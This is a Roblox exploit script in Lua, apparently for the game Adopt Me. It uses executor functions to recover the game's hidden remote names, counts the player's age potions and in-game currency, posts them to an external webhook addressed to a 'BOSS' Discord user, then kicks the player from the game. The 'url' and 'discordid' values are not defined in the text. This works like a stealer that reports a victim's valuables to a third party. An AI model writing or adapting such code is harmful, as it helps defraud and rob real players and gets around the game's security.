-- Import dependencies
local Data = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local localPlayer = game.Players.LocalPlayer
local FsysModule = game.ReplicatedStorage:WaitForChild("Fsys")

if not FsysModule then
    error("Fsys module not found in ReplicatedStorage")
end

local Fsys = require(FsysModule).load

-- Get and process currency amount
local rawAmount = game:GetService("Players").LocalPlayer.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text
local amount = rawAmount:gsub(",", "") -- Remove commas from the raw amount

-- Initialize variables
local Counter = 0
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer.PlayerGui

-- Create GUI
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.new(1, 1, 1)
frame.Parent = gui

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Text = "Starting"
textLabel.TextSize = 20
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.Parent = frame

-- Rename function
local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end

-- Access RouterClient and rename items in its upvalues
local routerClient = Fsys("RouterClient")
if type(routerClient.init) == "function" then
    local success, upvalue = pcall(function()
        return getupvalue(routerClient.init, 4)
    end)
    if success and type(upvalue) == "table" then
        for key, value in pairs(upvalue) do
            rename(key, value)
        end
    else
        warn("Failed to get upvalue at index 4")
    end
else
    error("RouterClient init is not a function")
end

-- Count age potions in inventory
for i, v in pairs(Data.get_data()[tostring(game.Players.LocalPlayer)].inventory.food) do
    if v.kind == "pet_age_potion" then
        Counter = Counter + 1
        task.wait(0.1)
    end
end

-- Wait before sending data
wait(1)

-- Prepare data for the webhook
local data = {
    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks"),
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn.request

local payload = {
    Url = url,
    Body = newdata,
    Method = "POST",
    Headers = headers
}

-- Send the request
request(payload)

-- Final action: Kick player
wait(1)
localPlayer:Kick("🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks")
